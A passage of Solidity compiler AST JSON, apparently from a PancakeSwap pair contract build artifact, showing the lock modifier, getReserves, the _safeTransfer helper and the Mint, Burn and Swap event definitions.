																"typeString": "literal_string \"Pancake: LOCKED\""
															}
														],
														"id": 496,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "1284:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 501,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1284:41:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 502,
												"nodeType": "ExpressionStatement",
												"src": "1284:41:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 505,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 503,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 494,
														"src": "1335:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 504,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1346:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1335:12:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 506,
												"nodeType": "ExpressionStatement",
												"src": "1335:12:1"
											},
											{
												"id": 507,
												"nodeType": "PlaceholderStatement",
												"src": "1357:1:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 510,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 508,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 494,
														"src": "1368:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 509,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1379:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "1368:12:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 511,
												"nodeType": "ExpressionStatement",
												"src": "1368:12:1"
											}
										]
									},
									"documentation": null,
									"id": 513,
									"name": "lock",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 495,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1271:2:1"
									},
									"src": "1258:129:1",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 534,
										"nodeType": "Block",
										"src": "1577:117:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 524,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 522,
														"name": "_reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 516,
														"src": "1587:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 523,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 481,
														"src": "1599:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1587:20:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 525,
												"nodeType": "ExpressionStatement",
												"src": "1587:20:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 528,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 526,
														"name": "_reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 518,
														"src": "1617:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 527,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 483,
														"src": "1629:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1617:20:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 529,
												"nodeType": "ExpressionStatement",
												"src": "1617:20:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 532,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 530,
														"name": "_blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 520,
														"src": "1647:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 531,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 485,
														"src": "1669:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "1647:40:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 533,
												"nodeType": "ExpressionStatement",
												"src": "1647:40:1"
											}
										]
									},
									"documentation": null,
									"id": 535,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 514,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1413:2:1"
									},
									"returnParameters": {
										"id": 521,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 516,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 535,
												"src": "1474:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 515,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1474:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 518,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 535,
												"src": "1505:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 517,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1505:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 520,
												"name": "_blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 535,
												"src": "1536:26:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 519,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "1536:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1460:112:1"
									},
									"scope": 1700,
									"src": "1393:301:1",
									"stateMutability": "view",
									"superFunction": 2168,
									"visibility": "public"
								},
								{
									"body": {
										"id": 576,
										"nodeType": "Block",
										"src": "1770:268:1",
										"statements": [
											{
												"assignments": [
													545,
													547
												],
												"declarations": [
													{
														"constant": false,
														"id": 545,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"scope": 576,
														"src": "1781:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 544,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1781:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 547,
														"name": "data",
														"nodeType": "VariableDeclaration",
														"scope": 576,
														"src": "1795:17:1",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 546,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "1795:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 557,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 552,
																	"name": "SELECTOR",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 471,
																	"src": "1863:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 553,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 539,
																	"src": "1873:2:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 554,
																	"name": "value",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 541,
																	"src": "1877:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	},
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 550,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2430,
																	"src": "1840:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 551,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSelector",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1840:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithselector_pure$_t_bytes4_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (bytes4) pure returns (bytes memory)"
																}
															},
															"id": 555,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1840:43:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 548,
															"name": "token",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 537,
															"src": "1816:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 549,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1816:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 556,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1816:77:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1780:113:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 572,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 559,
																"name": "success",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 545,
																"src": "1924:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 570,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 563,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"id": 560,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 547,
																					"src": "1936:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				"id": 561,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "length",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "1936:11:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "==",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 562,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1951:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "1936:16:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "||",
																		"rightExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 566,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 547,
																					"src": "1967:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"id": 567,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "1974:4:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_bool_$",
																								"typeString": "type(bool)"
																							},
																							"typeName": "bool"
																						}
																					],
																					"id": 568,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "1973:6:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					},
																					{
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 564,
																					"name": "abi",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2430,
																					"src": "1956:3:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_abi",
																						"typeString": "abi"
																					}
																				},
																				"id": 565,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"memberName": "decode",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "1956:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
																					"typeString": "function () pure"
																				}
																			},
																			"id": 569,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1956:24:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "1936:44:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	}
																],
																"id": 571,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1935:46:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "1924:57:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a205452414e534645525f4641494c4544",
															"id": 573,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1995:26:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															},
															"value": "Pancake: TRANSFER_FAILED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															}
														],
														"id": 558,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "1903:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 574,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1903:128:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 575,
												"nodeType": "ExpressionStatement",
												"src": "1903:128:1"
											}
										]
									},
									"documentation": null,
									"id": 577,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_safeTransfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 542,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 537,
												"name": "token",
												"nodeType": "VariableDeclaration",
												"scope": 577,
												"src": "1723:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 536,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1723:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 539,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 577,
												"src": "1738:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 538,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1738:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 541,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 577,
												"src": "1750:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 540,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1750:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1722:39:1"
									},
									"returnParameters": {
										"id": 543,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1770:0:1"
									},
									"scope": 1700,
									"src": "1700:338:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 585,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 584,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 579,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "2055:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 578,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2055:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 581,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "2079:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 580,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2079:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 583,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "2093:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 582,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2093:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2054:52:1"
									},
									"src": "2044:63:1"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 595,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 594,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 587,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "2132:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 586,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2132:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 589,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "2164:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 588,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2164:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 591,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "2186:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 590,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2186:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 593,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "2208:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 592,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2208:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2122:110:1"
									},
									"src": "2112:121:1"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 609,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 608,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 597,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2258:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 596,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2258:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 599,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2290:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 598,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2290:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 601,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2314:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 600,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2314:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 603,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2338:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 602,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2338:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 605,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2363:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 604,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2363:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 607,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 609,
												"src": "2388:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
